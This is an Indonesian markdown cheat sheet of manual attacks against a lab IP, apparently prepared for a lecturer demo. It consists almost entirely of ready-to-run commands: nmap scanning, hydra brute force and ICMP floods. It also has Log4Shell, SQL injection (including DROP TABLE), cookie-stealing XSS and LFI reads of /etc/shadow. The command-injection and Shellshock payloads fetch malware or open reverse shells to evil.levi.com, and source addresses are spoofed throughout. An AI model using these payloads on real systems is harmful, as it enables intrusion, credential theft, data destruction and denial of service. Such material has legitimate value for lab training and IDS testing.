# 🔥 Cheat Sheet Serangan Manual — Demo Dosen
> Target: `192.168.216.128` | Interface: `eth0`

---

## ⚙️ SETUP — jalankan 1x di awal

```bash
for i in 104 105 106 107 108 109 110; do sudo ip addr add 192.168.216.$i/24 dev eth0; done
```

---

## 1️⃣ Port Scan — nmap

```bash
sudo nmap -S 192.168.216.101 -e eth0 -sV -sC -A -T5 -p 1-65535 192.168.216.128 -Pn
```

---

## 2️⃣ SSH Brute Force — hydra

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.216.128 -t 4 -V
```
```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p 123456 ssh://192.168.216.128 -t 4 -V
```
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.216.128/ -V
```

---

## 3️⃣ ICMP Flood — ping

```bash
sudo ping -f -c 1000 -s 65500 192.168.216.128
```
```bash
sudo hping3 -1 -a 192.168.216.103 -I eth0 -c 500 192.168.216.128
```

---

## 4️⃣ Log4Shell — CVE-2021-44228

```bash
curl --interface 192.168.216.104 -H 'User-Agent: ${jndi:ldap://evil.levi.com/Log4Shell}' http://192.168.216.128/
```
```bash
curl --interface 192.168.216.104 -H 'X-Api-Version: ${jndi:ldap://attacker.levi.com/a}' http://192.168.216.128/
```
```bash
curl --interface 192.168.216.104 -H 'X-Forwarded-For: ${jndi:rmi://evil.levi.com/obj}' http://192.168.216.128/
```
```bash
curl --interface 192.168.216.104 -H 'Authorization: ${jndi:dns://evil.levi.com/x}' http://192.168.216.128/
```
```bash
curl --interface 192.168.216.104 -H 'Cookie: ${jndi:ldap://evil.levi.com/cookie}' http://192.168.216.128/
```

---

## 5️⃣ SQL Injection

```bash
curl --interface 192.168.216.105 "http://192.168.216.128/?id=1'+OR+'1'='1'--"
```
```bash
curl --interface 192.168.216.105 "http://192.168.216.128/?id=1+UNION+SELECT+1,2,3,table_name+FROM+information_schema.tables--"
```
```bash
curl --interface 192.168.216.105 "http://192.168.216.128/?id=1;DROP+TABLE+users--"
```
```bash
curl --interface 192.168.216.105 "http://192.168.216.128/?id=1+AND+SLEEP(5)--"
```
```bash
curl --interface 192.168.216.105 "http://192.168.216.128/?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
```

---

## 6️⃣ XSS — Cross-Site Scripting

```bash
curl --interface 192.168.216.106 "http://192.168.216.128/?search=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
```
```bash
curl --interface 192.168.216.106 -H 'Referer: <script>document.location="http://evil.levi.com/steal?c="+document.cookie</script>' http://192.168.216.128/
```
```bash
curl --interface 192.168.216.106 "http://192.168.216.128/?name=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E"
```
```bash
curl --interface 192.168.216.106 "http://192.168.216.128/?url=javascript:eval(atob('YWxlcnQoJ1hTUycp'))"
```

---

## 7️⃣ LFI / Path Traversal

```bash
curl --interface 192.168.216.107 "http://192.168.216.128/?file=../../../../../../../../etc/passwd"
```
```bash
curl --interface 192.168.216.107 "http://192.168.216.128/?page=..%2F..%2F..%2F..%2Fetc%2Fshadow"
```
```bash
curl --interface 192.168.216.107 "http://192.168.216.128/?file=php://filter/convert.base64-encode/resource=/etc/passwd"
```
```bash
curl --interface 192.168.216.107 "http://192.168.216.128/?file=/proc/self/environ"
```
```bash
curl --interface 192.168.216.107 "http://192.168.216.128/?page=....//....//....//etc/passwd"
```

---

## 8️⃣ RCE / Command Injection

```bash
curl --interface 192.168.216.108 "http://192.168.216.128/?cmd=cat+/etc/passwd;id;uname+-a"
```
```bash
curl --interface 192.168.216.108 -H 'X-Api-Version: ;wget http://evil.levi.com/malware.sh -O /tmp/x;bash /tmp/x' http://192.168.216.128/
```
```bash
curl --interface 192.168.216.108 "http://192.168.216.128/?cmd=nc+-e+/bin/bash+evil.levi.com+4444"
```
```bash
curl --interface 192.168.216.108 "http://192.168.216.128/?exec=python3+-c+'import+socket,os;os.system(\"id\")'"
```

---

## 9️⃣ Shellshock — CVE-2014-6271

```bash
curl --interface 192.168.216.109 -H $'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/evil.levi.com/4444 0>&1' http://192.168.216.128/cgi-bin/test.cgi
```
```bash
curl --interface 192.168.216.109 -H $'Referer: () { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd' http://192.168.216.128/cgi-bin/admin
```
```bash
curl --interface 192.168.216.109 -H $'Cookie: () { ignored; }; /bin/bash -i >& /dev/tcp/evil.levi.com/1234 0>&1' http://192.168.216.128/cgi-bin/login
```
```bash
curl --interface 192.168.216.109 -A $'() { :;}; /usr/bin/wget http://evil.levi.com/backdoor -O /tmp/bd' http://192.168.216.128/cgi-bin/test
```

---

## 🔟 Web Scanner — Nikto

```bash
nikto -h http://192.168.216.128 -maxtime 60s -nointeractive
```
```bash
curl --interface 192.168.216.110 -H 'User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)' http://192.168.216.128/
```
```bash
curl --interface 192.168.216.110 -H 'User-Agent: Mozilla/5.00 (Nikto/2.1.6)' http://192.168.216.128/.git/config
```
```bash
curl --interface 192.168.216.110 -H 'User-Agent: Mozilla/5.00 (Nikto/2.1.6)' http://192.168.216.128/.env
```
```bash
curl --interface 192.168.216.110 -H 'User-Agent: Mozilla/5.00 (Nikto/2.1.6)' http://192.168.216.128/phpmyadmin/
```
```bash
curl --interface 192.168.216.110 -H 'User-Agent: Mozilla/5.00 (Nikto/2.1.6)' http://192.168.216.128/wp-admin/
```

---

## 🧹 CLEANUP — jalankan 1x di akhir

```bash
for i in 104 105 106 107 108 109 110; do sudo ip addr del 192.168.216.$i/24 dev eth0; done
```
